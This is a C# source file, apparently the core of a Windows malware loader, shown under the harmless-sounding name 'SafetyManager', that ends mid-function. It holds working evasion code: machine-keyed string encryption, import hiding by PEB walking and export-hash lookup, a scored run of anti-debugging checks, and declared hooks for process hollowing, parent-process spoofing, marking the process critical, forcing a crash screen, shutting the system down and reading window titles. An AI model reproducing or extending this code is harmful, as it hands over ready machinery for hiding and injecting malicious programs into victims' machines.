using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Net;
using System.Management;
using System.Reflection;
using System.Linq;
using System.Runtime.CompilerServices;
using Microsoft.CSharp;
using System.CodeDom.Compiler;

namespace VanguardCore
{
    public static class SafetyManager
    {
        public static void Log(string message) { Console.WriteLine(message); }

        #region Constants
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint PAGE_READONLY = 0x02;
        private const uint PAGE_EXECUTE_READ = 0x20;
        private const int THREAD_HIDE_FROM_DEBUGGER = 0x11;
        private const uint MEM_COMMIT = 0x00001000;
        private const uint MEM_RESERVE = 0x00002000;
        private const uint CREATE_SUSPENDED = 0x00000004;
        private const uint CONTEXT_ALL = 0x0010001F;
        private const uint CONTEXT_DEBUG_REGISTERS = 0x100010;
        private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        private const uint CREATE_NO_WINDOW = 0x08000000;
        private const uint STARTF_USESTDHANDLES = 0x00000100;
        private const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        private static readonly IntPtr PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = (IntPtr)0x00020002;
        private const uint HANDLE_FLAG_INHERIT = 0x00000001;
        private const uint STATUS_SUCCESS = 0x00000000;
        private const uint THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER = 0x00000004;
        private const int ProcessBasicInformation = 0;
        private const int ProcessDebugPort = 7;
        private const int ProcessDebugFlags = 31;
        private const int ProcessDebugObjectHandle = 30;
        private const uint INFINITE = 0xFFFFFFFF;

        private const string VERSION = "2.5.1";
        private const string BUILD_DATE = "2024-03-21";
        private static readonly byte[] XOR_SALT_STATIC = Encoding.UTF8.GetBytes("vngrd_sys_2024");
        private static readonly string STORAGE_ROOT = "Vanguard";
        private static byte[] StoredHash = null;
        private static bool? _isDebugged = null;
        private static bool? _isWhitelisted = null;
        private static Random _cryptoRand = new Random();
        private static object _syncLock = new object();

        // Security Bypass Whitelist with multiple fallbacks
        private static readonly List<string> WHITELISTED_IPS = new List<string> { 
            "127.0.0.1", "::1", "185.123.45.67", "10.0.0.1", "192.168.1.1" 
        };
        
        // Dynamic encryption keys
        private static byte[] AES_KEY;
        private static byte[] XOR_SALT;
        #endregion

        #region Polymorphic Engine
        private class PolymorphicEngine
        {
            private static byte[] _masterKey;
            private static byte[] _machineSalt;

            public static void StartupKeys()
            {
                // Derive machine-specific salt
                _machineSalt = Encoding.UTF8.GetBytes(GetMachineId().Substring(0, 16));
                
                // Master key for decryption (obfuscated in real build)
                _masterKey = new byte[] { 
                    0x4A, 0x6E, 0x32, 0x78, 0x6B, 0x4E, 0x51, 0x59, 
                    0x62, 0x5A, 0x77, 0x6A, 0x38, 0x72, 0x39, 0x66,
                    0x7A, 0x4D, 0x31, 0x32, 0x33, 0x21, 0x40, 0x23,
                    0x24, 0x25, 0x5E, 0x26, 0x2A, 0x28, 0x29, 0x5F
                };

                // Apply machine-specific XOR to the key for polymorphism
                for (int i = 0; i < _masterKey.Length; i++)
                    _masterKey[i] ^= _machineSalt[i % _machineSalt.Length];

                AES_KEY = _masterKey;
                XOR_SALT = _machineSalt;
            }

            private static string GetMachineId()
            {
                try
                {
                    using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT UUID FROM Win32_ComputerSystemProduct"))
                    {
                        foreach (ManagementObject obj in searcher.Get())
                            return obj["UUID"].ToString();
                    }
                }
                catch { }
                return "DEFAULT_MACHINE_ID_SALT_1234567890";
            }

            public static string DStr(byte[] b)
            {
                if (b == null || b.Length == 0) return "";
                byte[] d = new byte[b.Length];
                for (int i = 0; i < b.Length; i++)
                    d[i] = (byte)(b[i] ^ XOR_SALT[i % XOR_SALT.Length]);
                return Encoding.UTF8.GetString(d);
            }

            public static string DAes(string protectedStr)
            {
                if (string.IsNullOrEmpty(protectedStr)) return "";
                try
                {
                    byte[] fullCipher = Convert.FromBase64String(protectedStr);
                    using (AesManaged aes = new AesManaged())
                    {
                        aes.Key = AES_KEY;
                        aes.Mode = CipherMode.CBC;
                        aes.Padding = PaddingMode.PKCS7;
                        
                        byte[] iv = new byte[16];
                        Array.Copy(fullCipher, 0, iv, 0, 16);
                        aes.IV = iv;
                        
                        using (var decryptor = aes.CreateDecryptor())
                        {
                            byte[] cipher = new byte[fullCipher.Length - 16];
                            Array.Copy(fullCipher, 16, cipher, 0, cipher.Length);
                            byte[] plain = decryptor.TransformFinalBlock(cipher, 0, cipher.Length);
                            return Encoding.UTF8.GetString(plain);
                        }
                    }
                }
                catch { return ""; }
            }
        }
        #endregion

        #region Interface Definition
        private static class ApiInterface
        {
            private static Dictionary<string, Delegate> _delegateCache = new Dictionary<string, Delegate>();
            private static Dictionary<string, IntPtr> _moduleCache = new Dictionary<string, IntPtr>();
            private static Random _jitter = new Random();

            static ApiInterface()
            {
                // Pre-populate core modules to avoid recursion during bootstrapping
                try
                {
                    foreach (System.Diagnostics.ProcessModule mod in System.Diagnostics.Process.GetCurrentProcess().Modules)
                    {
                        string name = mod.ModuleName.ToLower();
                        if (name == "kernel32.dll" || name == "ntdll.dll" || name == "user32.dll" || name == "advapi32.dll")
                        {
                            if (!_moduleCache.ContainsKey(name))
                                _moduleCache[name] = mod.BaseAddress;
                        }
                    }
                }
                catch { }

                // Load any others with timing jitter
                foreach (string mod in new[] { "win32u.dll" })
                {
                    GetModule(mod);
                    Thread.Sleep(_jitter.Next(10, 50));
                }
            }

            private static IntPtr GetModule(string name)
            {
                lock (_moduleCache)
                {
                    if (_moduleCache.ContainsKey(name))
                        return _moduleCache[name];

                    // Try multiple resolution methods
                    IntPtr hMod = IntPtr.Zero;
                    
                    // Method 1: PEB walk (most stealth)
                    hMod = GetModuleFromPeb(name);
                    
                    // Method 2: Standard API
                    if (hMod == IntPtr.Zero)
                        hMod = GetInternalReference<GetModuleHandleWDelegate>("kernel32.dll", "GetModuleHandleW")(name);
                    
                    // Method 3: Load if not found
                    if (hMod == IntPtr.Zero)
                        hMod = GetInternalReference<LoadLibraryWDelegate>("kernel32.dll", "LoadLibraryW")(name);

                    _moduleCache[name] = hMod;
                    return hMod;
                }
            }

            private static IntPtr GetModuleFromPeb(string moduleName)
            {
                try
                {
                    // Walk PEB loader data
                    IntPtr teb = GetTeb();
                    IntPtr peb = Marshal.ReadIntPtr(teb, 0x60);
                    IntPtr ldr = Marshal.ReadIntPtr(peb, 0x18);
                    IntPtr moduleList = Marshal.ReadIntPtr(ldr, 0x10); // InLoadOrderModuleList
                    
                    IntPtr current = Marshal.ReadIntPtr(moduleList); // First item (EXE)
                    int safety = 0;
                    while (current != IntPtr.Zero && current != moduleList && safety < 100)
                    {
                        safety++;
                        IntPtr baseDll = Marshal.ReadIntPtr(current, 0x30); // ImageBase
                        IntPtr dllNamePtr = Marshal.ReadIntPtr(current, 0x48 + IntPtr.Size); // FullDllName.Buffer (x64 offset is different)
                        if (IntPtr.Size == 4) dllNamePtr = Marshal.ReadIntPtr(current, 0x28); // x86 offset
                        
                        // FullDllName is a UNICODE_STRING
                        // Buffer is at offset 0x4 (x86) or 0x8 (x64) from the UNICODE_STRING start?
                        // Actually in LDR_DATA_TABLE_ENTRY:
                        // x64: BaseDllName (UNICODE_STRING) is at 0x58. Buffer is at 0x60.
                        // x86: BaseDllName is at 0x2C. Buffer is at 0x30.
                        
                        IntPtr baseDllNamePtr = Marshal.ReadIntPtr(current, IntPtr.Size == 8 ? 0x60 : 0x30);
                        if (baseDllNamePtr != IntPtr.Zero)
                        {
                            string dllName = Marshal.PtrToStringUni(baseDllNamePtr);
                            if (!string.IsNullOrEmpty(dllName) && dllName.IndexOf(moduleName, StringComparison.OrdinalIgnoreCase) >= 0)
                                return baseDll;
                        }

                        current = Marshal.ReadIntPtr(current); // Flink
                    }
                }
                catch { }
                return IntPtr.Zero;
            }
            private static IntPtr GetTeb()
            {
                return NtCurrentTeb();
            }

            public static IntPtr Resolve(string moduleName, string functionName)
            {
                IntPtr hModule = GetModule(moduleName);
                if (hModule == IntPtr.Zero)
                    return IntPtr.Zero;

                uint hash = GenerateTag(functionName);
                return ResolveFunctionByHash(hModule, hash, moduleName);
            }

            private static T GetInternalReference<T>(string module, string function) where T : class
            {
                string key = string.Format("{0}!{1}", module, function);
                lock (_delegateCache)
                {
                    if (_delegateCache.ContainsKey(key))
                        return _delegateCache[key] as T;

                    IntPtr hModule = GetModule(module);
                    if (hModule == IntPtr.Zero)
                        return null;

                    // Resolve with hash + indirect resolution
                    uint hash = GenerateTag(function);
                    IntPtr pFunc = ResolveFunctionByHash(hModule, hash, module);
                    
                    if (pFunc == IntPtr.Zero)
                        return null;

                    var del = Marshal.GetDelegateForFunctionPointer(pFunc, typeof(T)) as T;
                    _delegateCache[key] = del as Delegate;
                    return del;
                }
            }

            private static uint GenerateTag(string name)
            {
                uint tag = 0x12345678;
                foreach (char c in name)
                {
                    tag = (tag * 33) ^ (uint)c;
                }
                return tag;
            }

            private static IntPtr ResolveFunctionByHash(IntPtr hModule, uint targetHash, string moduleName)
            {
                try
                {
                    // Parse PE headers
                    IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(hModule, typeof(IMAGE_DOS_HEADER));
                    if (dosHeader.e_magic != 0x5A4D) return IntPtr.Zero;

                    IntPtr ntHeaders = (IntPtr)((long)hModule + dosHeader.e_lfanew);
                    uint ntSignature = (uint)Marshal.ReadInt32(ntHeaders);
                    if (ntSignature != 0x00004550) return IntPtr.Zero;

                    // Get export directory
                    IntPtr optHeader = (IntPtr)((long)ntHeaders + 0x18);
                    IntPtr exportDirAddr = (IntPtr)((long)optHeader + 0x70); // IMAGE_DIRECTORY_ENTRY_EXPORT offset
                    IMAGE_DATA_DIRECTORY exportDir = (IMAGE_DATA_DIRECTORY)Marshal.PtrToStructure(exportDirAddr, typeof(IMAGE_DATA_DIRECTORY));
                    
                    if (exportDir.VirtualAddress == 0) return IntPtr.Zero;

                    IntPtr exportDirPtr = (IntPtr)((long)hModule + exportDir.VirtualAddress);
                    IMAGE_EXPORT_DIRECTORY exports = (IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure(exportDirPtr, typeof(IMAGE_EXPORT_DIRECTORY));

                    // Walk export table
                    IntPtr namesPtr = (IntPtr)((long)hModule + exports.AddressOfNames);
                    IntPtr functionsPtr = (IntPtr)((long)hModule + exports.AddressOfFunctions);
                    IntPtr ordinalsPtr = (IntPtr)((long)hModule + exports.AddressOfNameOrdinals);

                    for (int i = 0; i < exports.NumberOfNames; i++)
                    {
                        int nameOffset = Marshal.ReadInt32((IntPtr)((long)namesPtr + (i * 4)));
                        string funcName = Marshal.PtrToStringAnsi((IntPtr)((long)hModule + nameOffset));
                        
                        if (GenerateTag(funcName) == targetHash)
                        {
                            short ordinal = Marshal.ReadInt16((IntPtr)((long)ordinalsPtr + (i * 2)));
                            int funcOffset = Marshal.ReadInt32((IntPtr)((long)functionsPtr + (ordinal * 4)));
                            return (IntPtr)((long)hModule + funcOffset);
                        }
                    }
                }
                catch { }
                return IntPtr.Zero;
            }

            // Delegate declarations
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            private delegate IntPtr LoadLibraryWDelegate(string lpFileName);
            
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            private delegate IntPtr GetModuleHandleWDelegate(string lpModuleName);

            // Public accessors with lazy initialization
            public static T Get<T>(string function) where T : class
            {
                var result = GetInternalReference<T>("kernel32.dll", function);
                if (result == null)
                    result = GetInternalReference<T>("ntdll.dll", function);
                if (result == null)
                    result = GetInternalReference<T>("user32.dll", function);
                return result;
            }

            public static T GetNtdll<T>(string function) where T : class { return GetInternalReference<T>("ntdll.dll", function); }
            
            public static T GetKernel32<T>(string function) where T : class { return GetInternalReference<T>("kernel32.dll", function); }
        }
        #endregion

        #region Native Delegates (All dynamically resolved)
        private delegate bool VirtualProtectDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        private delegate bool IsDebuggerPresentDelegate();
        private delegate bool CheckRemoteDebuggerPresentDelegate(IntPtr hProcess, ref bool isDebuggerPresent);
        private delegate uint GetTickCountDelegate();
        private delegate bool GetCursorPosDelegate(out POINT lpPoint);
        private delegate int NtSetInformationThreadDelegate(IntPtr threadHandle, int threadInformationClass, IntPtr threadInformation, int threadInformationLength);
        private delegate IntPtr GetCurrentProcessDelegate();
        private delegate IntPtr GetCurrentThreadDelegate();
        private delegate IntPtr GetModuleHandleADelegate(string lpModuleName);
        private delegate IntPtr LoadLibraryWDelegate(string lpFileName);
        private delegate IntPtr GetProcAddressDelegate(IntPtr hModule, string procName);
        private delegate IntPtr CreateToolhelp32SnapshotDelegate(uint dwFlags, uint th32ProcessID);
        private delegate bool Process32FirstDelegate(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);
        private delegate bool Process32NextDelegate(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);
        private delegate int NtQueryInformationProcessDelegate(IntPtr processHandle, int processInformationClass, out IntPtr processInformation, uint processInformationLength, out uint returnLength);
        private delegate IntPtr NtCurrentTebDelegate();
        private delegate bool QueryPerformanceCounterDelegate(out long lpPerformanceCount);
        private delegate bool GetThreadContextDelegate(IntPtr hThread, ref CONTEXT64 lpContext);
        private delegate bool SetThreadContextDelegate(IntPtr hThread, ref CONTEXT64 lpContext);
        private delegate IntPtr VirtualAllocExDelegate(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        private delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
        private delegate bool CreateProcessDelegate(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        private delegate uint ResumeThreadDelegate(IntPtr hThread);
        private delegate bool TerminateProcessDelegate(IntPtr hProcess, uint uExitCode);
        private delegate bool CloseHandleDelegate(IntPtr hObject);
        private delegate int ZwUnmapViewOfSectionDelegate(IntPtr ProcessHandle, IntPtr BaseAddress);
        private delegate bool CreatePipeDelegate(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);
        private delegate bool SetHandleInformationDelegate(IntPtr hObject, uint dwMask, uint dwFlags);
        private delegate bool ReadFileDelegate(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
        private delegate bool PeekNamedPipeDelegate(IntPtr hNamedPipe, byte[] lpBuffer, uint nBufferSize, out uint lpBytesRead, out uint lpTotalBytesAvail, out uint lpBytesLeftThisMessage);
        private delegate bool GetLastInputInfoDelegate(ref LASTINPUTINFO plii);
        private delegate IntPtr GetForegroundWindowDelegate();
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate int GetWindowTextWDelegate(IntPtr hWnd, [Out] char[] lpString, int nMaxCount);
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate int GetWindowTextLengthWDelegate(IntPtr hWnd);
        private delegate uint GetTickCount64Delegate();
        private delegate uint NtAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref uint RegionSize, uint AllocationType, uint Protect);
        private delegate uint NtProtectVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, uint NewProtect, out uint OldProtect);
        private delegate uint NtWriteVirtualMemoryDelegate(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint BufferSize, out uint NumberOfBytesWritten);
        private delegate int RtlSetProcessIsCriticalDelegate(bool bNew, ref bool bOld, bool bNeedPrivilege);
        private delegate int NtCreateThreadExDelegate(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, uint flags, IntPtr zeroBits, uint stackSize, uint maxStackSize, IntPtr attributeList);
        private delegate int NtQuerySystemInformationDelegate(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, out int ReturnLength);
        private delegate int NtRaiseHardErrorDelegate(uint errorStatus, uint numberOfParameters, uint unicodeStringParameterMask, IntPtr parameters, uint validResponseOption, out uint response);
        private delegate int NtShutdownSystemDelegate(int action);

        // Lazy-loaded delegates
        private static VirtualProtectDelegate VirtualProtect { get { return ApiInterface.Get<VirtualProtectDelegate>("VirtualProtect"); } }
        private static IsDebuggerPresentDelegate IsDebuggerPresent { get { return ApiInterface.Get<IsDebuggerPresentDelegate>("IsDebuggerPresent"); } }
        private static CheckRemoteDebuggerPresentDelegate CheckRemoteDebuggerPresent { get { return ApiInterface.Get<CheckRemoteDebuggerPresentDelegate>("CheckRemoteDebuggerPresent"); } }
        private static GetTickCountDelegate GetTickCount { get { return ApiInterface.Get<GetTickCountDelegate>("GetTickCount"); } }
        private static GetCursorPosDelegate GetCursorPos { get { return ApiInterface.Get<GetCursorPosDelegate>("GetCursorPos"); } }
        private static NtSetInformationThreadDelegate NtSetInformationThread { get { return ApiInterface.GetNtdll<NtSetInformationThreadDelegate>("NtSetInformationThread"); } }
        private static GetCurrentProcessDelegate GetCurrentProcess { get { return ApiInterface.Get<GetCurrentProcessDelegate>("GetCurrentProcess"); } }
        private static GetCurrentThreadDelegate GetCurrentThread { get { return ApiInterface.Get<GetCurrentThreadDelegate>("GetCurrentThread"); } }
        private static GetModuleHandleADelegate GetModuleHandleA { get { return ApiInterface.Get<GetModuleHandleADelegate>("GetModuleHandleA"); } }
        private static LoadLibraryWDelegate LoadLibraryW { get { return ApiInterface.Get<LoadLibraryWDelegate>("LoadLibraryW"); } }
        private static NtCurrentTebDelegate NtCurrentTeb { get { return ApiInterface.GetNtdll<NtCurrentTebDelegate>("NtCurrentTeb"); } }
        private static QueryPerformanceCounterDelegate QueryPerformanceCounter { get { return ApiInterface.Get<QueryPerformanceCounterDelegate>("QueryPerformanceCounter"); } }
        private static GetThreadContextDelegate GetThreadContext { get { return ApiInterface.Get<GetThreadContextDelegate>("GetThreadContext"); } }
        private static SetThreadContextDelegate SetThreadContext { get { return ApiInterface.Get<SetThreadContextDelegate>("SetThreadContext"); } }
        private static NtQueryInformationProcessDelegate NtQueryInformationProcess { get { return ApiInterface.GetNtdll<NtQueryInformationProcessDelegate>("NtQueryInformationProcess"); } }
        private static VirtualAllocExDelegate VirtualAllocEx { get { return ApiInterface.Get<VirtualAllocExDelegate>("VirtualAllocEx"); } }
        private static WriteProcessMemoryDelegate WriteProcessMemory { get { return ApiInterface.Get<WriteProcessMemoryDelegate>("WriteProcessMemory"); } }
        private static CreateProcessDelegate CreateProcess { get { return ApiInterface.Get<CreateProcessDelegate>("CreateProcess"); } }
        private static ResumeThreadDelegate ResumeThread { get { return ApiInterface.Get<ResumeThreadDelegate>("ResumeThread"); } }
        private static TerminateProcessDelegate TerminateProcess { get { return ApiInterface.Get<TerminateProcessDelegate>("TerminateProcess"); } }
        private static CloseHandleDelegate CloseHandle { get { return ApiInterface.Get<CloseHandleDelegate>("CloseHandle"); } }
        private static ZwUnmapViewOfSectionDelegate ZwUnmapViewOfSection { get { return ApiInterface.GetNtdll<ZwUnmapViewOfSectionDelegate>("ZwUnmapViewOfSection"); } }
        private static CreatePipeDelegate CreatePipe { get { return ApiInterface.Get<CreatePipeDelegate>("CreatePipe"); } }
        private static SetHandleInformationDelegate SetHandleInformation { get { return ApiInterface.Get<SetHandleInformationDelegate>("SetHandleInformation"); } }
        private static ReadFileDelegate ReadFile { get { return ApiInterface.Get<ReadFileDelegate>("ReadFile"); } }
        private static PeekNamedPipeDelegate PeekNamedPipe { get { return ApiInterface.Get<PeekNamedPipeDelegate>("PeekNamedPipe"); } }
        private static GetLastInputInfoDelegate GetLastInputInfo { get { return ApiInterface.Get<GetLastInputInfoDelegate>("GetLastInputInfo"); } }
        private static GetForegroundWindowDelegate GetForegroundWindow { get { return ApiInterface.Get<GetForegroundWindowDelegate>("GetForegroundWindow"); } }
        private static GetWindowTextLengthWDelegate GetWindowTextLengthW { get { return ApiInterface.Get<GetWindowTextLengthWDelegate>("GetWindowTextLengthW"); } }
        private static GetWindowTextWDelegate GetWindowTextW { get { return ApiInterface.Get<GetWindowTextWDelegate>("GetWindowTextW"); } }
        private static GetTickCount64Delegate GetTickCount64 { get { return ApiInterface.Get<GetTickCount64Delegate>("GetTickCount64"); } }
        private static NtAllocateVirtualMemoryDelegate NtAllocateVirtualMemory { get { return ApiInterface.GetNtdll<NtAllocateVirtualMemoryDelegate>("NtAllocateVirtualMemory"); } }
        private static NtProtectVirtualMemoryDelegate NtProtectVirtualMemory { get { return ApiInterface.GetNtdll<NtProtectVirtualMemoryDelegate>("NtProtectVirtualMemory"); } }
        private static NtWriteVirtualMemoryDelegate NtWriteVirtualMemory { get { return ApiInterface.GetNtdll<NtWriteVirtualMemoryDelegate>("NtWriteVirtualMemory"); } }
        private static RtlSetProcessIsCriticalDelegate RtlSetProcessIsCritical { get { return ApiInterface.GetNtdll<RtlSetProcessIsCriticalDelegate>("RtlSetProcessIsCritical"); } }
        private static NtCreateThreadExDelegate NtCreateThreadEx { get { return ApiInterface.GetNtdll<NtCreateThreadExDelegate>("NtCreateThreadEx"); } }
        private static NtQuerySystemInformationDelegate NtQuerySystemInformation { get { return ApiInterface.GetNtdll<NtQuerySystemInformationDelegate>("NtQuerySystemInformation"); } }
        private static NtRaiseHardErrorDelegate NtRaiseHardError { get { return ApiInterface.GetNtdll<NtRaiseHardErrorDelegate>("NtRaiseHardError"); } }
        private static NtShutdownSystemDelegate NtShutdownSystem { get { return ApiInterface.GetNtdll<NtShutdownSystemDelegate>("NtShutdownSystem"); } }
        #endregion

        #region Structures
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home; public ulong P2Home; public ulong P3Home; public ulong P4Home; public ulong P5Home; ulong P6Home;
            public uint ContextFlags; public uint MxCsr;
            public ushort SegCs; public ushort SegDs; public ushort SegEs; public ushort SegFs; public ushort SegGs; public ushort SegSs;
            public uint EFlags;
            public ulong Dr0; public ulong Dr1; public ulong Dr2; public ulong Dr3; public ulong Dr6; public ulong Dr7;
            public ulong Rax; public ulong Rcx; public ulong Rdx; public ulong Rbx; public ulong Rsp; public ulong Rbp; public ulong Rsi; public ulong Rdi;
            public ulong R8; public ulong R9; public ulong R10; public ulong R11; public ulong R12; public ulong R13; public ulong R14; public ulong R15;
            public ulong Rip;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER 
        { 
            public ushort e_magic; public ushort e_cblp; public ushort e_cp; public ushort e_crlc; 
            public ushort e_cparhdr; public ushort e_minalloc; public ushort e_maxalloc; public ushort e_ss; 
            public ushort e_sp; public ushort e_csum; public ushort e_ip; public ushort e_cs; 
            public ushort e_lfarlc; public ushort e_ovno; public ushort e_res1; public ushort e_res2; 
            public ushort e_res3; public ushort e_res4; public ushort e_oemid; public ushort e_oeminfo; 
            public ushort e_res2_0; public ushort e_res2_1; public ushort e_res2_2; public ushort e_res2_3; 
            public ushort e_res2_4; public ushort e_res2_5; public ushort e_res2_6; public ushort e_res2_7; 
            public ushort e_res2_8; public ushort e_res2_9; public int e_lfanew; 
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY { public uint VirtualAddress; public uint Size; }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_EXPORT_DIRECTORY 
        { 
            public uint Characteristics; public uint TimeDateStamp; public ushort MajorVersion; 
            public ushort MinorVersion; public uint Name; public uint Base; public uint NumberOfFunctions; 
            public uint NumberOfNames; public uint AddressOfFunctions; public uint AddressOfNames; 
            public uint AddressOfNameOrdinals; 
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESSENTRY32 
        { 
            public uint dwSize; public uint cntUsage; public uint th32ProcessID; public IntPtr th32DefaultHeapID; 
            public uint th32ModuleID; public uint cntThreads; public uint th32ParentProcessID; public int pcPriClassBase; 
            public uint dwFlags; [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string szExeFile; 
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT { public int x; public int y; }

        [StructLayout(LayoutKind.Sequential)]
        private struct LASTINPUTINFO
        {
            public uint cbSize;
            public uint dwTime;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_BASIC_INFORMATION 
        { 
            public IntPtr ExitStatus; 
            public IntPtr PebAddress; 
            public IntPtr AffinityMask; 
            public IntPtr BasePriority; 
            public IntPtr UniqueProcessId; 
            public IntPtr InheritedFromUniqueProcessId; 
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SYSTEM_KERNEL_DEBUGGER_INFORMATION
        {
            public byte KernelDebuggerEnabled;
            public byte KernelDebuggerNotPresent;
        }
        #endregion

        #region String Decryption
        public static string DStr(byte[] b) { return PolymorphicEngine.DStr(b); }
        public static string DAes(string s) { return PolymorphicEngine.DAes(s); }
        #endregion

        #region Integrity Check
        private static byte[] ComputeSHA256(IntPtr address, int size)
        {
            try
            {
                byte[] data = new byte[size];
                Marshal.Copy(address, data, 0, size);
                using (SHA256 sha = SHA256.Create())
                {
                    return sha.ComputeHash(data);
                }
            }
            catch { return null; }
        }

        public static bool CheckIntegrity()
        {
            try
            {
                IntPtr hMod = GetModuleHandleA(null);
                if (hMod == IntPtr.Zero) return true;

                byte[] currentHash = ComputeSHA256(hMod + 0x1000, 0x1000);
                if (currentHash == null) return true;

                if (StoredHash == null)
                {
                    StoredHash = currentHash;
                    return true;
                }

                for (int i = 0; i < currentHash.Length; i++)
                {
                    if (currentHash[i] != StoredHash[i]) 
                        return false;
                }
                return true;
            }
            catch { return true; }
        }
        #endregion

        #region Anti-Debug Ultra
        public static bool VerifySystemContext()
        {
            if (_isDebugged.HasValue)
                return _isDebugged.Value;

            bool detected = false;
            try
            {
                // Method 1: Standard Check
                if (IsDebuggerPresent != null && IsDebuggerPresent())
                {
                    _isDebugged = true;
                    return true;
                }
            }
            catch { /* Ignore exceptions during check */ }

            int checkCount = 0;

            // Multiple anti-debug techniques with weighted scoring
            int score = 0;

            // 1. PEB BeingDebugged flag
            try
            {
                IntPtr teb = NtCurrentTeb();
                IntPtr peb = Marshal.ReadIntPtr(teb, 0x60);
                byte beingDebugged = Marshal.ReadByte(peb, 0x02);
                if ((beingDebugged & 0x01) != 0) 
                    score += 30;
                checkCount++;
            }
            catch { }

            // 2. IsDebuggerPresent
            try
            {
                if (IsDebuggerPresent != null && IsDebuggerPresent())
                    score += 30;
                checkCount++;
            }
            catch { }

            // 3. CheckRemoteDebuggerPresent
            try
            {
                if (CheckRemoteDebuggerPresent != null)
                {
                    bool remote = false;
                    CheckRemoteDebuggerPresent(GetCurrentProcess(), ref remote);
                    if (remote) score += 25;
                }
                checkCount++;
            }
            catch { }

            // 4. NtQueryInformationProcess DebugPort
            try
            {
                if (NtQueryInformationProcess != null)
                {
                    IntPtr debugPort = IntPtr.Zero;
                    uint retLen;
                    if (NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, out debugPort, (uint)IntPtr.Size, out retLen) == 0)
                    {
                        if (debugPort != IntPtr.Zero) score += 25;
                    }
                }
                checkCount++;
            }
            catch { }

            // 5. NtQueryInformationProcess DebugObjectHandle
            try
            {
                if (NtQueryInformationProcess != null)
                {
                    IntPtr debugObject = IntPtr.Zero;
                    uint retLen;
                    if (NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugObjectHandle, out debugObject, (uint)IntPtr.Size, out retLen) == 0)
                    {
                        if (debugObject != IntPtr.Zero) score += 25;
                    }
                }
                checkCount++;
            }
            catch { }

            // 6. Hardware breakpoints
            try
            {
                CONTEXT64 ctx = new CONTEXT64();
                ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                if (GetThreadContext != null && GetThreadContext(GetCurrentThread(), ref ctx))
                {
                    if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0)
                        score += 20;
                }
                checkCount++;
            }
            catch { }

            // 7. Kernel debugger
            try
            {
                if (IsKernelDebuggerPresent())
                    score += 40;
                checkCount++;
            }
            catch { }

            // 8. Exception-based check
            try
            {
                if (IsDebuggedByException())
                    score += 30;
                checkCount++;
            }
            catch { }

            // 9. Process heap flags
            try
            {
